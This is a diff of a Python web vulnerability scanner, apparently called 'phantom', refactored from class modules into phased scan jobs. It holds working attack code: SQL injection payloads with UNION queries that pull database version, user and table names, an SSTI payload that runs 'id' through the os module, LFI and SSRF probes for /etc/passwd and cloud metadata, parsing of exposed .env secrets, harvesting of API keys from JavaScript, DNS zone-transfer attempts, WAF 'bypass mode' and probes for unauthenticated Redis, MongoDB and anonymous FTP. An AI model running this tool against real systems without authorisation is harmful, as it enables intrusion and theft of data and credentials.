-                for err_pattern in SQL_ERROR_PATTERNS:
-                    if re.search(err_pattern, body_lower, re.IGNORECASE):
-                        self.ui.log(f"SQLi error-based — param '{param}' | {payload[:30]}", "VULN")
-                        extracted = self._sqli_extract_info(url, param, params)
-                        self._vuln("SQL Injection", "CRITICAL", url,
-                                   parameter=param, payload=payload,
-                                   evidence=f"SQL error triggered. {extracted.get('info','')}",
-                                   extracted=extracted)
-                        return
-
-                # Time-based blind (>3s response)
-                if "SLEEP(3)" in payload.upper() or "WAITFOR" in payload.upper():
-                    t0 = time.time()
-                    self._req(url, params={**params, param: payload})
-                    if time.time() - t0 > 3.0:
-                        self._vuln("SQL Injection", "CRITICAL", url,
-                                   parameter=param, payload=payload,
-                                   evidence="Time-based blind SQLi — response delayed >3s")
-                        return
-
-    def _sqli_extract_info(self, url: str, param: str, params: dict) -> dict:
-        """Attempt to extract DB version/name as proof-of-concept."""
-        extracted = {}
-        # Try UNION-based extraction for DB version and name
-        for col_count in range(1, 6):
-            nulls = ",".join(["NULL"] * (col_count - 1))
-            for label, payload in [
-                ("db_version", f"' UNION SELECT {('NULL,' * max(0, col_count-1))}version()--"),
-                ("db_name",    f"' UNION SELECT {('NULL,' * max(0, col_count-1))}database()--"),
-                ("db_user",    f"' UNION SELECT {('NULL,' * max(0, col_count-1))}user()--"),
-            ]:
-                tp = params.copy(); tp[param] = payload
-                r  = self._req(url, params=tp)
-                if not r:
-                    continue
-                # Look for version string pattern
-                vm = re.search(r"\b(\d+\.\d+[\.\d\-\w]+)\b", r.text)
-                if vm and label == "db_version":
-                    extracted[label] = vm.group(1)
-                    self.ui.log(f"  Extracted DB version: {vm.group(1)}", "CHAIN")
-                um = re.search(r"\b([a-z_][a-z0-9_]+)@[\w\.]+\b", r.text)
-                if um and label in ("db_user", "db_name"):
-                    extracted[label] = um.group(0)
-                    self.ui.log(f"  Extracted {label}: {um.group(0)}", "CHAIN")
-                time.sleep(SCAN_DELAY if hasattr(self, '_') else REQUEST_DELAY)
-
-            if extracted:
-                # Also list table names via information_schema
-                tp = params.copy()
-                tp[param] = (f"' UNION SELECT GROUP_CONCAT(table_name),"
-                             f"{'NULL,'*(col_count-1)}NULL FROM information_schema.tables "
-                             f"WHERE table_schema=database()--")
-                r2 = self._req(url, params=tp)
-                if r2:
-                    # Look for comma-separated identifiers (table names)
-                    tm = re.search(r"\b([a-z_][a-z0-9_,]{5,100})\b", r2.text)
-                    if tm:
-                        extracted["tables_found"] = tm.group(0)[:200]
-                        self.ui.log(f"  Tables: {tm.group(0)[:60]}", "CHAIN")
-                break
-
-        extracted["info"] = " | ".join(f"{k}: {v}" for k, v in extracted.items())
-        return extracted
-
-    def test_sqli_forms(self) -> None:
-        for form in self.state.forms:
-            action  = form["action"]
-            method  = form["method"]
-            fields  = dict(form["inputs"])
-            for field_name in fields:
-                for payload in SQL_PAYLOADS[:15]:
-                    data = fields.copy(); data[field_name] = payload
-                    resp = (self._req(action, method="POST", data=data)
-                            if method == "POST"
-                            else self._req(action, params=data))
-                    if not resp:
-                        continue
-                    for err in SQL_ERROR_PATTERNS:
-                        if re.search(err, resp.text.lower(), re.IGNORECASE):
-                            self._vuln("SQL Injection", "CRITICAL", action,
-                                       parameter=field_name, payload=payload,
-                                       evidence="SQL error in form submission")
-                            return
-                    time.sleep(REQUEST_DELAY)
-
-    # ── Module B: XSS ─────────────────────────────────────────────────────────
-    def test_xss(self, url: str) -> None:
-        parsed = urlparse(url)
-        if not parsed.query:
-            return
-        params = dict(parse_qsl(parsed.query))
-        for param in params:
-            for payload in XSS_PAYLOADS:
-                tp = params.copy(); tp[param] = payload
-                resp = self._req(url, params=tp)
-                if not resp:
-                    continue
-                if payload in resp.text:
-                    if payload in ("{{7*7}}", "${7*7}", "#{7*7}") and "49" in resp.text:
-                        self._vuln("SSTI", "CRITICAL", url,
-                                   parameter=param, payload=payload,
-                                   evidence="Template expression 7*7=49 evaluated server-side")
-                        # SSTI confirmed → chain escalation
-                        self.state.add_finding(Finding(
-                            vuln_id="", type="SSTI",
-                            severity="CRITICAL", location=url,
-                            parameter=param,
-                            payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
-                            evidence="SSTI → RCE possible via OS module access",
-                            cvss=9.8, owasp="A03:2021", cwe="CWE-94",
-                            impact="Full remote code execution via template engine.",
-                            fix=["Use sandboxed template environment",
-                                 "Never pass user input to render()"],
-                            chain_type="SSTI_CONFIRMED"
-                        ))
-                    else:
-                        sev = "HIGH"
-                        self._vuln("Reflected XSS", sev, url,
-                                   parameter=param, payload=payload,
-                                   evidence="Payload reflected verbatim in response")
-                    return
-                time.sleep(REQUEST_DELAY)
-
-    def test_xss_forms(self) -> None:
-        for form in self.state.forms:
-            action = form["action"]
-            method = form["method"]
-            fields = dict(form["inputs"])
-            for field_name in fields:
-                for payload in XSS_PAYLOADS[:8]:
-                    data = fields.copy(); data[field_name] = payload
-                    resp = (self._req(action, method="POST", data=data)
-                            if method == "POST"
-                            else self._req(action, params=data))
-                    if resp and payload in resp.text:
-                        self._vuln("Reflected XSS", "HIGH", action,
-                                   parameter=field_name, payload=payload,
-                                   evidence="XSS payload reflected in form response")
-                        return
-                    time.sleep(REQUEST_DELAY)
-
-    # ── Module C: LFI ─────────────────────────────────────────────────────────
-    def test_lfi(self, url: str) -> None:
-        parsed = urlparse(url)
-        params = dict(parse_qsl(parsed.query))
-        file_params = {k: v for k, v in params.items()
-                       if any(kw in k.lower() for kw in LFI_FILE_PARAMS)}
-        for param in file_params:
-            for payload in LFI_PAYLOADS:
-                tp = params.copy(); tp[param] = payload
-                resp = self._req(url, params=tp)
-                if not resp:
-                    continue
-                for ind in LFI_INDICATORS:
-                    if ind in resp.text:
-                        extract = resp.text[:200] if "root:x:" in resp.text else ""
-                        self._vuln("LFI", "CRITICAL", url,
-                                   parameter=param, payload=payload,
-                                   evidence=f"File inclusion confirmed: {ind}",
-                                   extracted={"partial_content": extract},
-                                   chain_type="LFI_CONFIRMED")
-                        return
-                time.sleep(REQUEST_DELAY)
-
-    # ── Module D: SSRF ────────────────────────────────────────────────────────
-    def test_ssrf(self, url: str) -> None:
-        parsed = urlparse(url)
-        params = dict(parse_qsl(parsed.query))
-        ssrf_params = {k: v for k, v in params.items()
-                       if k.lower() in SSRF_PARAMS}
-        for param in ssrf_params:
-            for ssrf_url in SSRF_PAYLOADS[:8]:
-                tp = params.copy(); tp[param] = ssrf_url
-                t0 = time.time()
-                resp = self._req(url, params=tp)
-                elapsed = time.time() - t0
-                if not resp:
-                    continue
-                # AWS metadata indicators
-                if any(ind in resp.text for ind in
-                       ["ami-id", "instance-id", "iam/", "computeMetadata",
-                        "instanceMetadata", "root:x:"]):
-                    self._vuln("SSRF", "CRITICAL", url,
-                               parameter=param, payload=ssrf_url,
-                               evidence=f"SSRF to {ssrf_url} returned cloud metadata!")
-                    return
-                # Blind SSRF via timing (internal service response)
-                if elapsed > 3.0 and "169.254" in ssrf_url:
-                    self._vuln("SSRF", "HIGH", url,
-                               parameter=param, payload=ssrf_url,
-                               evidence=f"Blind SSRF — response delayed {elapsed:.1f}s on metadata URL")
-                    return
-                time.sleep(REQUEST_DELAY)
-
-    # ── Module E: Sensitive Files ──────────────────────────────────────────────
-    def test_sensitive_files(self) -> None:
-        base = self.base_url.rstrip("/")
-
-        def probe(path: str) -> Optional[dict]:
-            r = self._req(base + path, allow_redirects=False)
-            if r and r.status_code in (200, 401, 403):
-                return {"path": path, "status": r.status_code,
-                        "size": len(r.content), "content": r.text[:2000]}
-            return None
-
-        all_paths = SENSITIVE_PATHS + ADMIN_PATHS
-        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
-            futures = {ex.submit(probe, p): p for p in all_paths}
-            for fut in as_completed(futures):
-                result = fut.result()
-                if not result:
-                    continue
-                path, status, content = result["path"], result["status"], result["content"]
-                label = "EXPOSED" if status == 200 else "EXISTS(protected)"
-                self.ui.log(f"[{status}] {label}: {path}", "VULN" if status == 200 else "WARN")
-
-                if status == 200:
-                    extracted = self._parse_sensitive_content(path, content)
-                    self._vuln("Sensitive File Exposed", "HIGH", base + path,
-                               evidence=f"HTTP 200 — file publicly accessible",
-                               extracted=extracted,
-                               chain_type=("EXPOSED_ENV" if ".env" in path
-                                           else "EXPOSED_GIT" if ".git" in path
-                                           else ""))
-                    # Scan for API keys in exposed file
-                    for key_type, pattern in API_KEY_PATTERNS.items():
-                        m = re.search(pattern, content)
-                        if m:
-                            self._vuln("API Key Exposed", "CRITICAL", base + path,
-                                       evidence=f"{key_type}: {m.group(0)[:60]}",
-                                       extracted={"key_type": key_type,
-                                                  "value": m.group(0)[:80]})
-
-    def _parse_sensitive_content(self, path: str, content: str) -> dict:
-        """Extract structured data from exposed sensitive files."""
-        data = {}
-        if ".env" in path:
-            for kw in ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "AWS_SECRET",
-                       "DATABASE_URL", "REDIS_URL", "STRIPE_SECRET"]:
-                m = re.search(rf"{kw}\s*=\s*(\S+)", content, re.IGNORECASE)
-                if m:
-                    data[kw] = m.group(1)[:40] + "..."
-        elif ".git/config" in path:
-            m = re.search(r"url\s*=\s*(.+)", content)
-            if m:
-                data["repo_url"] = m.group(1).strip()
-        elif "phpinfo" in path:
-            vm = re.search(r"PHP Version\s*([\d.]+)", content)
-            if vm:
-                data["php_version"] = vm.group(1)
-        elif "swagger" in path or "api-docs" in path:
-            # Extract API endpoints
-            endpoints = re.findall(r'"/([\w/{}/]+)"', content)
-            data["api_endpoints"] = endpoints[:20]
-        elif "backup" in path and ".sql" in path:
-            tables = re.findall(r"CREATE TABLE `?(\w+)`?", content)
-            data["sql_tables"] = tables[:10]
-        return data
-
-    # ── Module F: CORS ────────────────────────────────────────────────────────
-    def test_cors(self) -> None:
-        test_origins = [
-            "https://evil-phantom-test.com",
-            "null",
-            f"https://{self.base_host}.evil.com",
-            f"https://evil.{self.base_host}",
-        ]
-        for origin in test_origins:
-            resp = self._req(self.base_url,
-                             headers={**self._headers(), "Origin": origin})
-            if not resp:
-                continue
-            acao = resp.headers.get("Access-Control-Allow-Origin", "")
-            acac = resp.headers.get("Access-Control-Allow-Credentials", "false")
-            if acao == "*":
-                self.ui.log("CORS wildcard (*) — note if credentials used", "WARN")
-            elif acao == origin:
-                sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
-                self._vuln("CORS Misconfiguration", sev, self.base_url,
-                           evidence=f"Origin '{origin}' reflected. ACAC={acac}",
-                           extracted={"origin_tested": origin,
-                                      "credentials_allowed": acac})
-                self.ui.log(f"CORS [{sev}]: origin '{origin}' reflected, creds={acac}", "VULN")
-
-    # ── Module G: Security Headers ────────────────────────────────────────────
-    def test_headers(self) -> None:
-        resp = self._req(self.base_url)
-        if not resp:
-            return
-        hlc  = {k.lower(): v for k, v in resp.headers.items()}
-        for hdr, (risk, desc, rec) in SECURITY_HEADERS.items():
-            if hdr.lower() not in hlc:
-                self._vuln("Missing Security Header",
-                           "HIGH" if risk == "HIGH" else "MEDIUM" if risk == "MEDIUM" else "LOW",
-                           self.base_url,
-                           evidence=f"No {hdr} header — {desc}",
-                           fix=[f"Add: {hdr}: {rec}"])
-                self.ui.log(f"Missing header: {hdr} [{risk}]", "WARN")
-            else:
-                val = hlc[hdr.lower()]
-                # Weak CSP check
-                if hdr == "Content-Security-Policy" and (
-                    "unsafe-inline" in val or "unsafe-eval" in val
-                ):
-                    self._vuln("Missing Security Header", "MEDIUM", self.base_url,
-                               evidence=f"Weak CSP: {val[:60]}",
-                               fix=["Remove unsafe-inline and unsafe-eval from CSP"])
-
-        # Check for information-leaking headers
-        for leak_hdr in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"]:
-            if leak_hdr.lower() in hlc:
-                self.ui.log(f"Info leak header: {leak_hdr}: {hlc[leak_hdr.lower()]}", "WARN")
-                self.state.add_finding(Finding(
-                    vuln_id="", type="Info Disclosure",
-                    severity="LOW", location=self.base_url,
-                    evidence=f"{leak_hdr}: {hlc[leak_hdr.lower()]}",
-                    cvss=3.0, owasp="A05:2021", cwe="CWE-200",
-                    impact="Exposes server/tech stack — aids targeted exploits",
-                    fix=[f"Remove or obfuscate {leak_hdr} response header"],
-                ))
-
-    # ── Module H: Session & Cookie Security ───────────────────────────────────
-    def test_session_cookies(self) -> None:
-        resp = self._req(self.base_url)
-        if not resp:
-            return
-        for cookie in resp.cookies:
-            flags   = []
-            raw_sc  = resp.headers.get("Set-Cookie", "").lower()
-            if not cookie.secure:    flags.append("No Secure flag")
-            if "httponly" not in raw_sc: flags.append("No HttpOnly flag")
-            if "samesite" not in raw_sc: flags.append("No SameSite flag")
-            if flags:
-                self._vuln("Insecure Cookie", "MEDIUM", self.base_url,
-                           parameter=cookie.name,
-                           evidence=f"Cookie '{cookie.name}': {', '.join(flags)}",
-                           fix=["Set-Cookie: name=val; Secure; HttpOnly; SameSite=Strict"])
-
-        # JWT in response body or headers
-        jwt_pattern = r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*"
-        for m in re.finditer(jwt_pattern, resp.text):
-            token = m.group(0)
+    # DNS
+    if DNS_AVAILABLE:
+        for rtype in ["A","MX","NS","TXT","CNAME"]:
             try:
-                header_b64  = token.split(".")[0] + "=="
-                payload_b64 = token.split(".")[1] + "=="
-                header_json  = json.loads(base64.urlsafe_b64decode(header_b64))
-                payload_json = json.loads(base64.urlsafe_b64decode(payload_b64))
-                alg  = header_json.get("alg", "unknown")
-                sensitive_keys = [k for k in payload_json if k in
-                                  ("password", "pwd", "secret", "ssn", "credit_card", "role")]
-                evidence = f"JWT found. alg={alg}, claims={list(payload_json.keys())[:5]}"
-                if sensitive_keys:
-                    evidence += f" — SENSITIVE data in payload: {sensitive_keys}"
-                self.ui.log(f"JWT detected: alg={alg}", "WARN")
-                self.state.add_finding(Finding(
-                    vuln_id="", type="JWT Security Issue",
-                    severity="MEDIUM" if not sensitive_keys else "HIGH",
-                    location=self.base_url,
-                    evidence=evidence,
-                    cvss=5.3, owasp="A07:2021", cwe="CWE-347",
-                    impact="JWT tampering, alg:none attack, weak secret bruteforce",
-                    fix=["Use strong secret for HS256 (256+ bits)",
-                         "Use RS256 with proper key management",
-                         "Never store sensitive data in JWT payload"],
-                ))
-            except Exception:
-                pass
+                ans = dns.resolver.resolve(job.host, rtype)
+                for r in ans: job.log(f"DNS {rtype}: {r}", "OK")
+            except: pass
+        try:
+            ns_recs = dns.resolver.resolve(job.host, "NS")
+            for ns in ns_recs:
+                z = dns.zone.from_xfr(dns.query.xfr(str(ns), job.host))
+                if z:
+                    job.log(f"ZONE TRANSFER from {ns}!", "VULN")
+                    job.add_vuln("DNS Zone Transfer", str(ns),
+                                 evidence="AXFR returned zone data — full subdomain list")
+        except: pass
+    job.advance("Phase 0: OSINT")
 
-        # Check for CSRF tokens in forms
-        for form in self.state.forms:
-            if form["method"] == "POST":
-                inputs = form["inputs"]
-                has_csrf = any(
-                    any(kw in name.lower() for kw in ["csrf", "token", "_token", "xsrf"])
-                    for name in inputs
-                )
-                if not has_csrf:
-                    self.state.add_finding(Finding(
-                        vuln_id="", type="Missing CSRF Protection",
-                        severity="MEDIUM",
-                        location=form["action"],
-                        evidence="POST form has no CSRF token",
-                        cvss=6.5, owasp="A01:2021", cwe="CWE-352",
-                        impact="Attacker can forge authenticated requests on behalf of victim",
-                        fix=["Add random CSRF token to all POST forms",
-                             "Validate token server-side on every state-changing request"],
-                    ))
+    # WHOIS
+    if WHOIS_AVAILABLE:
+        try:
+            w = wh.whois(job.host)
+            if w.registrar: job.log(f"Registrar: {w.registrar}", "OK")
+        except: pass
+    job.advance("Phase 0: OSINT")
 
-    # ── Module I: Command Injection ────────────────────────────────────────────
-    def test_cmdi(self, url: str) -> None:
-        parsed = urlparse(url)
-        if not parsed.query:
-            return
-        params = dict(parse_qsl(parsed.query))
-        for param in params:
-            # Time-based detection
-            tp = params.copy(); tp[param] = "; sleep 3"
-            t0   = time.time()
-            resp = self._req(url, params=tp)
-            if resp and (time.time() - t0) > 3.0:
-                self._vuln("Command Injection", "CRITICAL", url,
-                           parameter=param, payload="; sleep 3",
-                           evidence="Response delayed >3s — time-based CMDi confirmed")
+    # WAF detection
+    try:
+        r = requests.get(job.url + "/?q=<script>alert(1)</script>",
+                         headers={"User-Agent": USER_AGENTS[0]},
+                         timeout=8, verify=False)
+        hs = str(r.headers).lower()
+        waf = None
+        if "cloudflare" in hs:         waf = "Cloudflare"
+        elif "x-sucuri-id" in hs:      waf = "Sucuri WAF"
+        elif "incapsula" in hs:        waf = "Incapsula"
+        elif "x-amzn-requestid" in hs: waf = "AWS WAF"
+        elif r.status_code in (403,406,429): waf = "Unknown WAF"
+        if waf:
+            job.waf = waf
+            job.log(f"WAF Detected: {waf} — enabling bypass mode", "WARN")
+        else:
+            job.log("No WAF detected — easier to test", "OK")
+    except: pass
+    job.advance("Phase 0: OSINT", 2)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  PHASE 1 — PORT SCANNER
+# ══════════════════════════════════════════════════════════════════════════════
+def probe_port(host: str, port: int) -> Optional[dict]:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1.2)
+        if s.connect_ex((host, port)) == 0:
+            banner = ""
+            try:
+                if port in (80,8080,8000): s.send(b"HEAD / HTTP/1.0\r\n\r\n")
+                banner = s.recv(256).decode("utf-8",errors="ignore").strip()[:100]
+            except: pass
+            s.close()
+            return {"port": port, "banner": banner}
+        s.close()
+    except: pass
+    return None
+
+def detect_service(port: int, banner: str) -> dict:
+    PORT_SVC = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
+                110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",1433:"MSSQL",
+                3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5672:"RabbitMQ",
+                6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",9200:"Elasticsearch",
+                9300:"Elastic-Transport",10000:"Webmin",11211:"Memcached",
+                27017:"MongoDB",50000:"DB2",8888:"Jupyter",5000:"Dev-Server"}
+    svc  = PORT_SVC.get(port, f"Port-{port}")
+    cves = []
+    for pattern, checks in VERSION_CVE.items():
+        m = re.search(pattern, banner, re.IGNORECASE)
+        if m:
+            try:
+                ver = tuple(int(x) for x in m.group(1).split(".")[:3])
+                for threshold, cve_desc in checks:
+                    if ver < threshold:
+                        cves.append(cve_desc)
+            except: pass
+    return {"service": svc, "version": m.group(0)[:40] if (m := re.search(r"[\w./]+[\d]+\.[\d.]+", banner)) else "", "cves": cves}
+
+def phase_ports(job: ScanJob) -> None:
+    job.set_phase("Phase 1: Ports", len(TOP_PORTS))
+    job.log(f"Scanning {len(TOP_PORTS)} ports on {job.host}...", "INFO")
+    with ThreadPoolExecutor(max_workers=25) as ex:
+        futs = {ex.submit(probe_port, job.host, p): p for p in TOP_PORTS}
+        for fut in as_completed(futs):
+            port = futs[fut]
+            res  = fut.result()
+            if res:
+                info  = detect_service(port, res["banner"])
+                entry = {**res, **info}
+                with job._lock: job.ports.append(entry)
+                if port in DANGEROUS_PORTS:
+                    job.log(f"★ {DANGEROUS_PORTS[port]} on port {port} OPEN!", "VULN")
+                    job.add_vuln("Open Port (Dangerous)", f"{job.host}:{port}",
+                                 evidence=f"{info['service']} open — often unauthenticated")
+                else:
+                    job.log(f"Port {port} ({info['service']}) open", "OK")
+                for cve in info["cves"]:
+                    job.add_vuln("Outdated Service CVE", f"{job.host}:{port}",
+                                 evidence=f"{info['version']} — {cve}")
+            job.advance("Phase 1: Ports")
+
+    # Service chain attacks
+    port_nums = [p["port"] for p in job.ports]
+    if 6379 in port_nums:  _chain_redis(job)
+    if 9200 in port_nums:  _chain_elasticsearch(job)
+    if 27017 in port_nums: _chain_mongodb(job)
+    if 21 in port_nums:    _chain_ftp(job)
+
+def _chain_redis(job: ScanJob) -> None:
+    try:
+        s = socket.socket(); s.settimeout(3); s.connect((job.host, 6379))
+        s.send(b"INFO server\r\n")
+        data = s.recv(1024).decode("utf-8",errors="ignore"); s.close()
+        if "redis_version" in data:
+            v = (re.search(r"redis_version:(.+)", data) or type("",(),{"group":lambda *_:"?"})()).group(1)
+            job.chain_event(f"Redis unauth — version {str(v).strip()}")
+            job.add_vuln("Unauthenticated Redis", f"redis://{job.host}:6379",
+                         evidence=f"INFO accessible — v{str(v).strip()}", chain_type="OPEN_REDIS")
+    except: pass
+
+def _chain_elasticsearch(job: ScanJob) -> None:
+    try:
+        r = requests.get(f"http://{job.host}:9200/_cat/indices?v", timeout=4, verify=False)
+        if r.status_code == 200 and ("green" in r.text or "yellow" in r.text):
+            job.chain_event("Elasticsearch indices exposed without auth")
+            job.add_vuln("Unauthenticated Elasticsearch", f"http://{job.host}:9200",
+                         evidence="/_cat/indices returned data without credentials")
+    except: pass
+
+def _chain_mongodb(job: ScanJob) -> None:
+    try:
+        s = socket.socket(); s.settimeout(3); s.connect((job.host, 27017))
+        probe = (b"\x41\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00"
+                 b"\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\x01\x00\x00\x00"
+                 b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00")
+        s.send(probe); data = s.recv(512); s.close()
+        if len(data) > 20:
+            job.chain_event("MongoDB responded without authentication")
+            job.add_vuln("Unauthenticated MongoDB", f"mongodb://{job.host}:27017",
+                         evidence="Wire protocol response without credentials")
+    except: pass
+
+def _chain_ftp(job: ScanJob) -> None:
+    try:
+        s = socket.socket(); s.settimeout(4); s.connect((job.host, 21))
+        banner = s.recv(256).decode("utf-8",errors="ignore")
+        s.send(b"USER anonymous\r\n"); time.sleep(0.4); s.recv(256)
+        s.send(b"PASS anon@phantom.test\r\n"); time.sleep(0.4)
+        resp = s.recv(256).decode("utf-8",errors="ignore"); s.close()
+        if "230" in resp:
+            job.chain_event("FTP anonymous login accepted!")
+            job.add_vuln("FTP Anonymous Login", f"ftp://{job.host}:21",
+                         evidence=f"Anonymous login OK. Banner: {banner[:60]}")
+    except: pass
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  PHASE 2 — RECURSIVE SPIDER
+# ══════════════════════════════════════════════════════════════════════════════
+JS_ENDPOINT_RE = [
+    r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]""",
+    r"""axios\.\w+\s*\(\s*['"`]([^'"`]+)['"`]""",
+    r"""(?:url|endpoint|path)\s*[=:]\s*['"`]([/][^'"`\s]{3,})['"`]""",
+    r"""ws[s]?://[^'"`\s]+""",
+]
+
+def _crawl_url(job: ScanJob, url: str, depth: int) -> None:
+    if depth > CRAWL_DEPTH or len(job.urls) >= MAX_URLS or url in job.urls:
+        return
+    job.urls.add(url)
+    resp = job.req(url)
+    if not resp: return
+    soup = BeautifulSoup(resp.text, "html.parser")
+    base_d = urlparse(job.url).netloc
+
+    for tag, attr in [("a","href"),("form","action"),("script","src"),("link","href"),("iframe","src")]:
+        for el in soup.find_all(tag):
+            raw = el.get(attr,"")
+            if not raw or raw.startswith(("mailto:","tel:","#","javascript:")): continue
+            full  = urljoin(url, raw)
+            p     = urlparse(full)
+            if p.netloc != base_d: continue
+            clean = p._replace(fragment="").geturl()
+            if tag == "script" and attr == "src" and clean not in job.js_files:
+                job.js_files.add(clean)
+            if clean not in job.urls and len(job.urls) < MAX_URLS:
+                _crawl_url(job, clean, depth + 1)
+
+    # Parse inline JS
+    for script in soup.find_all("script"):
+        _parse_js_content(job, script.string or "", url)
+
+    # Extract forms
+    for form in soup.find_all("form"):
+        action = urljoin(url, form.get("action", url))
+        method = form.get("method","get").upper()
+        inputs = {i.get("name"): i.get("value","")
+                  for i in form.find_all(["input","textarea","select"]) if i.get("name")}
+        if inputs:
+            entry = {"action": action, "method": method, "inputs": inputs}
+            if entry not in job.forms:
+                with job._lock: job.forms.append(entry)
+
+    # HTML comments
+    import bs4
+    for c in soup.find_all(string=lambda t: isinstance(t, bs4.Comment)):
+        for p in re.findall(r"(/[a-zA-Z0-9_\-/]{3,})", str(c)):
+            job.urls.add(urljoin(url, p))
+        job.log(f"HTML comment: {str(c)[:60]}", "WARN")
+
+def _parse_js_content(job: ScanJob, js: str, source: str) -> None:
+    base_d = urlparse(job.url).netloc
+    for pattern in JS_ENDPOINT_RE:
+        for m in re.finditer(pattern, js):
+            path = m.group(1) if m.lastindex else m.group(0)
+            if path.startswith("/"): full = urljoin(job.url, path)
+            elif path.startswith("http"): full = path
+            else: continue
+            if urlparse(full).netloc in ("", base_d): job.urls.add(full)
+    for key_type, pattern in API_KEY_PATTERNS.items():
+        for m in re.finditer(pattern, js):
+            found = m.group(0)[:80]
+            if not any(found == s.get("value","")[:80] for s in job.secrets):
+                with job._lock:
+                    job.secrets.append({"type": key_type, "value": found, "source": source})
+                job.log(f"SECRET in JS: {key_type} — {found[:40]}", "VULN")
+                job.add_vuln("API Key Exposed", source, evidence=f"{key_type}: {found[:40]}...")
+
+def phase_spider(job: ScanJob) -> None:
+    job.set_phase("Phase 2: Spider", 5)
+    job.log("Starting recursive spider...", "INFO")
+
+    # robots.txt
+    r = job.req(urljoin(job.url, "/robots.txt"))
+    if r and r.status_code == 200:
+        for line in r.text.splitlines():
+            if line.lower().startswith("disallow:"):
+                p = line.split(":",1)[1].strip()
+                if p and p != "/": job.urls.add(urljoin(job.url, p))
+        job.log(f"robots.txt parsed — {r.text.count('Disallow')} entries", "OK")
+    job.advance("Phase 2: Spider")
+
+    # sitemap.xml
+    r = job.req(urljoin(job.url, "/sitemap.xml"))
+    if r and r.status_code == 200:
+        for m in re.finditer(r"<loc>(.*?)</loc>", r.text):
+            if urlparse(m.group(1)).netloc == job.host: job.urls.add(m.group(1).strip())
+    job.advance("Phase 2: Spider")
+
+    # Crawl
+    _crawl_url(job, job.url, 0)
+    job.advance("Phase 2: Spider")
+
+    # Fetch JS files
+    for js_url in list(job.js_files):
+        r = job.req(js_url)
+        if r and r.status_code == 200:
+            _parse_js_content(job, r.text, js_url)
+    job.advance("Phase 2: Spider")
+
+    job.log(f"Spider done — {len(job.urls)} URLs, {len(job.forms)} forms, {len(job.js_files)} JS", "OK")
+    job.advance("Phase 2: Spider")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  PHASE 3 — VULNERABILITY MODULES
+# ══════════════════════════════════════════════════════════════════════════════
+
+# Module A: SQLi
+def _sqli_extract(job: ScanJob, url: str, param: str, params: dict) -> str:
+    for cols in range(1, 5):
+        for label, p in [("version","version()"),("db","database()"),("user","user()")]:
+            pfx = "NULL," * (cols - 1)
+            tp  = params.copy(); tp[param] = f"' UNION SELECT {pfx}{p}--"
+            r   = job.req(url, params=tp)
+            if not r: continue
+            vm = re.search(r"\b(\d+\.\d+[\.\d\-\w]+)\b", r.text)
+            um = re.search(r"\b([a-z_][a-z0-9_]+)@[\w.]+\b", r.text)
+            if vm or um:
+                val = (vm or um).group(0)
+                job.chain_event(f"SQLi data extracted — {label}: {val}")
+                return val
+    return ""
+
+def _test_sqli_url(job: ScanJob, url: str) -> None:
+    parsed = urlparse(url)
+    if not parsed.query: return
+    params = dict(parse_qsl(parsed.query))
+    for param in params:
+        for payload in SQL_PAYLOADS:
+            tp = params.copy(); tp[param] = payload
+            r  = job.req(url, params=tp, waf_bypass=True)
+            if not r: continue
+            for err in SQL_ERRORS:
+                if re.search(err, r.text.lower(), re.IGNORECASE):
+                    extracted_val = _sqli_extract(job, url, param, params)
+                    job.add_vuln("SQL Injection", url, param=param, payload=payload,
+                                 evidence=f"SQL error triggered. {f'Extracted: {extracted_val}' if extracted_val else ''}",
+                                 chain_type="SQLI_CONFIRMED")
+                    return
+            if "SLEEP(3)" in payload.upper():
+                t0 = time.time()
+                job.req(url, params={**params, param: payload})
+                if time.time() - t0 > 3.0:
+                    job.add_vuln("SQL Injection", url, param=param, payload=payload,
+                                 evidence="Time-based blind SQLi — response delayed >3s")
+                    return
+
+def _test_sqli_forms(job: ScanJob) -> None:
+    for form in job.forms:
+        fields = dict(form["inputs"])
+        for field in fields:
+            for payload in SQL_PAYLOADS[:12]:
+                data = fields.copy(); data[field] = payload
+                r = (job.req(form["action"], method="POST", data=data)
+                     if form["method"] == "POST" else job.req(form["action"], params=data))
+                if r:
+                    for err in SQL_ERRORS:
+                        if re.search(err, r.text.lower(), re.IGNORECASE):
+                            job.add_vuln("SQL Injection (Form)", form["action"],
+                                         param=field, payload=payload,
+                                         evidence="SQL error in form submission")
+                            return
+
+# Module B: XSS
+def _test_xss_url(job: ScanJob, url: str) -> None:
+    parsed = urlparse(url)
+    if not parsed.query: return
+    params = dict(parse_qsl(parsed.query))
+    for param in params:
+        for payload in XSS_PAYLOADS:
+            tp = params.copy(); tp[param] = payload
+            r  = job.req(url, params=tp)
+            if r and payload in r.text:
+                if payload in ("{{7*7}}","${7*7}","#{7*7}") and "49" in r.text:
+                    job.add_vuln("SSTI", url, param=param, payload=payload,
+                                 evidence="Template expression 7*7=49 evaluated server-side — RCE possible",
+                                 chain_type="SSTI_CONFIRMED")
+                else:
+                    job.add_vuln("Reflected XSS", url, param=param, payload=payload,
+                                 evidence="Payload reflected verbatim in response")
                 return
 
-            # Output-based detection
-            for payload in CMD_PAYLOADS[:6]:
-                tp = params.copy(); tp[param] = payload
-                resp = self._req(url, params=tp)
-                if resp and any(ind in resp.text for ind in CMD_INDICATORS):
-                    self._vuln("Command Injection", "CRITICAL", url,
-                               parameter=param, payload=payload,
-                               evidence=f"Command output detected in response")
+def _test_xss_forms(job: ScanJob) -> None:
+    for form in job.forms:
+        fields = dict(form["inputs"])
